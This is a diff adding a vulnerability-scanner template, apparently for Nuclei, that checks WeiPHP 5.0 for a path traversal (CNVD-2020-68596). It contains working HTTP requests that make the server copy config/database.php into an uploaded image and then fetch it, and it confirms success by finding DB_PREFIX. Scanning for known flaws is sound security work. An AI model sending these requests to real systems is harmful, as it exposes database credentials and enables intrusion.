@@ -1,0 +1,49 @@
+id: CNVD-2020-68596
+
+info:
+  name: WeiPHP 5.0 Path Traversal
+  author: pikpikcu
+  severity: critical
+  reference: http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596.html
+  tags: weiphp,lfi,cnvd
+
+requests:
+  - raw:
+      - |
+        POST /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Content-Length: 5
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: deflate
+
+        "1":1
+      - |
+        GET /public/index.php/home/file/user_pics HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Accept-Encoding: gzip
+        Accept-Encoding: deflate
+
+      - |
+        GET {{endpoint}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Accept-Encoding: deflate
+
+    extractors:
+      - type: regex
+        name: endpoint
+        part: body
+        internal: true
+        regex:
+          - '/public/uploads/picture/(.*.jpg)'
+
+    matchers:
+      - type: word
+        words:
+          - https://weiphp.cn
+          - WeiPHP
+          - DB_PREFIX
+        condition: and
+        part: body
